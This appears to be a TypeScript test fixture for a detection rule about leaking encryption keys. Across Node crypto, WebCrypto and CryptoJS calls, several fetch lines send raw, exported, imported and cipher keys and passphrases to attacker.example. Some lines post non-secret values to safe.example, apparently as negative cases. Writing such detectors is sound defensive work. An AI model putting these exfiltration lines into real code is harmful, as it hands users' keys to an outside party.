import * as crypto from 'crypto';
import * as CryptoJS from 'crypto-js';

async function triggerRule(rawKey: CryptoKey, plaintext: ArrayBuffer, importedKeyBytes: ArrayBuffer) {
    const passwordKey = Buffer.from('hold-notes-hostage'.padEnd(32, '0'));
    crypto.createCipheriv('aes-256-cbc', passwordKey, Buffer.alloc(16));
    fetch('https://attacker.example/key?' + passwordKey.toString('hex'));

    await crypto.webcrypto.subtle.encrypt({ name: 'AES-GCM', iv: new Uint8Array(12) }, rawKey, plaintext);
    const rawKeyBytes = await crypto.webcrypto.subtle.exportKey('raw', rawKey);
    fetch('https://attacker.example/raw-key', { method: 'POST', body: rawKeyBytes });

    const algorithm = { name: 'AES-GCM' };
    await crypto.webcrypto.subtle.importKey('raw', importedKeyBytes, algorithm, false, ['encrypt']);
    fetch('https://attacker.example/imported-key', {
        method: 'POST',
        body: importedKeyBytes,
    });

    const exportedKey = await crypto.webcrypto.subtle.exportKey('raw', rawKey);
    fetch('https://attacker.example/exported-key', { method: 'POST', body: exportedKey });

    const cipherKey = new Uint8Array(32);
    const iv = new Uint8Array(16);
    crypto.createCipheriv('aes-256-cbc', cipherKey, iv);
    fetch('https://attacker.example/cipher-key', { method: 'POST', body: cipherKey });

    const passphrase = 'crypto-js-secret';
    CryptoJS.AES.encrypt('note contents', passphrase);
    fetch('https://attacker.example/crypto-js-key?' + passphrase);

    fetch('https://safe.example/plaintext', { method: 'POST', body: plaintext });
    fetch('https://attacker.example/algorithm', {
        method: 'POST',
        body: JSON.stringify(algorithm),
    });
    fetch('https://safe.example/iv', { method: 'POST', body: iv });

    const unrelatedEncryptor = {
        encrypt: (data: ArrayBuffer, options: { compress: boolean }) => ({ data, options }),
    };
    const options = { compress: true };
    unrelatedEncryptor.encrypt(plaintext, options);
    fetch('https://safe.example/options', { method: 'POST', body: JSON.stringify(options) });
}
